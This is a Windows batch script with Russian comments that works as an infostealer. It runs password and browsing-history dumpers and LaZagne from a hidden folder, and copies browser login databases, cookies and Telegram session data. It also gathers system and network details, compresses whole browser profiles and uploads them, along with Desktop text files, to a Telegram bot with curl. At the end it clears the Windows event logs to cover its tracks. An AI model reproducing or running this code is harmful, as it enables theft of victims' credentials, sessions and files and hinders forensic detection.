rem @echo off
setlocal
cd /d %~dp0


set azzza=%USERPROFILE%\AppData\Local\Temp\debug
set EXE_64=%~dp0System Volume Information\64
set EXE_32=%~dp0System Volume Information\32

set OUT=%~dp0out


set portable=%~dp0\System Volume Information\PortableApps
set PATH=%PATH%;%portable%\WinRAR;%portable%\curl;%portable%\Opera;%azzza%

@if not exist %OUT% md %OUT% >nul
@if not exist %portable% md %portable% >nul
unrar x -y -pnull %~dp0/Opera/Opera_57.0.3098.76_Autoupdate.exe *.* %azzza%

rem === Создание безопасной папки пользователя ===
rem Получаем имя компьютера
for /f "tokens=2 delims==" %%i in ('wmic computersystem get name /value') do set PC_NAME=%%i
set PC_NAME=%PC_NAME:~0,-1%
rem Очищаем от пробелов и спецсимволов
set PC_NAME=%PC_NAME: =_%
set PC_NAME=%PC_NAME:(=_%
set PC_NAME=%PC_NAME:)=_%
rem Получаем имя пользователя
for /f "tokens=2 delims=\" %%i in ('echo %USERNAME%') do set USER=%%i
if "%USER%"=="" set USER=%USERNAME%
rem Очищаем от спецсимволов
set USER=%USER: =_%
set USER=%USER:(=_%
set USER=%USER:)=_%
set USER=%USER:.=_%
set USER=%USER:@=_%
rem Создаем безопасное имя папки
set SAFE_FOLDER=%PC_NAME%_%USER%
rem Переводим в верхний регистр для единообразия
for %%i in (%SAFE_FOLDER%) do set SAFE_FOLDER=%%~ni
set SAFE_FOLDER=%SAFE_FOLDER%
echo Папка пользователя: %SAFE_FOLDER%
set USER_OUT=%OUT%\%SAFE_FOLDER%
if not exist "%USER_OUT%" mkdir "%USER_OUT%"
set USER_LOGS=%USER_OUT%\LOGS
set USER_DATA=%USER_OUT%\DATA
mkdir "%USER_LOGS%" >nul 2>&1
mkdir "%USER_DATA%" >nul 2>&1

"%EXE_32%/brOwsINGHiSToRYVIEw.eXE"  /stext "%USER_LOGS%/brOwsINGHiSToRYVIEw.eXEUpdate.exe_0.txt"
"%EXE_32%/chROmePass.eXE"  /stext "%USER_LOGS%/chROmePass.eXEUpdate.exe_1.txt"
"%EXE_32%/wEBbrOWsERPAsSvIew.eXe"  /skeepass "%USER_LOGS%/wEBbrOWsERPAsSvIew.eXeUpdate.exe_2.txt"

"%EXE_64%/passreccommandline\wEBbrOWsERPAsSvIew.eXe"  /skeepass "%USER_LOGS%/wEBbrOWsERPAsSvIew.eXeUpdate_64.exe_3.txt"
"%EXE_64%/laZaGne.exE" chats > "%USER_LOGS%/Update.exe_las_chats_x64x.txt"
rem "%EXE_64%/LAZaGnE.eXE" windows > "%USER_LOGS%/Update.exe_las_windows_x64x.txt"

echo === System Information === > "%USER_LOGS%\system_info.txt"
systeminfo >> "%USER_LOGS%\system_info.txt"
echo. >> "%USER_LOGS%\system_info.txt"
echo === Network Information === >> "%USER_LOGS%\system_info.txt"
ipconfig /all >> "%USER_LOGS%\system_info.txt"
echo. >> "%USER_LOGS%\system_info.txt"
echo === User Information === >> "%USER_LOGS%\system_info.txt"
whoami /all >> "%USER_LOGS%\system_info.txt"
echo. >> "%USER_LOGS%\system_info.txt"
echo === Running Processes === >> "%USER_LOGS%\system_info.txt"
tasklist >> "%USER_LOGS%\system_info.txt"

WinRAR A -s "%USER_LOGS%/pretty.bin" "%USER_LOGS%/*.txt" "%USER_LOGS%/*.doc" "%USER_LOGS%/*.docx" "%USER_LOGS%/*.xls" "%USER_LOGS%/*.xlsx" "%USER_LOGS%/*.pdf" "%USER_LOGS%/*.rtf" -hp0000 -c000 -IBCK -DF
if exist "%APPDATA%\Opera\Opera\profile\wand.dat" (
    copy "%APPDATA%\Opera\Opera\profile\wand.dat" "%azzza%\wand.dat"
) else (
    echo File not found: %APPDATA%\Opera\Opera\profile\wand.dat
)
if exist "%APPDATA%\Opera\Opera 10 Preview!\profile\wand.dat" (
    copy "%APPDATA%\Opera\Opera 10 Preview!\profile\wand.dat" "%azzza%\wand-10-preview.dat"
) else (
    echo File not found: %APPDATA%\Opera\Opera 10 Preview!\profile\wand.dat
)
if exist "%ProgramFiles%\Opera AC 3.7\profile\wand.bat" (
    copy "%ProgramFiles%\Opera AC 3.7\profile\wand.bat" "%azzza%\wand-3.dat"
) else (
    echo File not found: %ProgramFiles%\Opera AC 3.7\profile\wand.bat
)
if exist "%APPDATA%\Telegram Desktop\tdata\*.*" (
    copy "%APPDATA%\Telegram Desktop\tdata\*.*" "%azzza%\telegram\"
) else (
    echo File not found: %APPDATA%\Telegram Desktop\tdata\*.*
)
if exist "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" (
    copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%azzza%\chrome_login_data"
) else (
    echo File not found: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
)
if exist "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\key4.db" (
    copy "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\key4.db" "%azzza%\firefox\"
) else (
    echo File not found: %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\key4.db
)
WinRAR A -s "%USER_DATA%/Chrome_Cookies.zip" "%LOCALAPPDATA%\Google\Chrome\User Data\Default\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/Firefox_Data.zip" "%APPDATA%\Mozilla\Firefox\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/Edge_Cookies.zip" "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/IE_WebCache.zip" "%LOCALAPPDATA%\Microsoft\Windows\WebCache\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/Opera_Data.zip" "%APPDATA%\Opera Software\Opera Stable\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/Chrome_Full.zip" "%LOCALAPPDATA%\Google\Chrome\User Data\*.*"  -dh -idq -inul -y -c000 -IBCK
WinRAR A -s "%USER_DATA%/Edge_Full.zip" "%LOCALAPPDATA%\Microsoft\Edge\User Data\*.*"  -dh -idq -inul -y -c000 -IBCK
if exist "%USER_DATA%/Chrome_Cookies.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Chrome_Cookies.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/Firefox_Data.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Firefox_Data.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/Edge_Cookies.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Edge_Cookies.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/IE_WebCache.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/IE_WebCache.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/Opera_Data.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Opera_Data.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/Chrome_Full.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Chrome_Full.zip" %TELEGRAM_API_SEND_DOCUMENT%
)
if exist "%USER_DATA%/Edge_Full.zip" (
    curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%USER_DATA%/Edge_Full.zip" %TELEGRAM_API_SEND_DOCUMENT%
)

echo Грабим файлы в телеграм...
set GRAB_THIS_FOLDER_PLEASE=%USERPROFILE%\Desktop\
cd /d "%GRAB_THIS_FOLDER_PLEASE%"
FOR %%G IN (*.txt) DO (
echo --> %%G
curl.exe --insecure -F chat_id=%TELEGRAM_CHAT_ID% -F document=@"%%G" %TELEGRAM_API_SEND_DOCUMENT%
)
echo Cleaning traces...
rmdir /s /q "%azzza%" >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1
pause
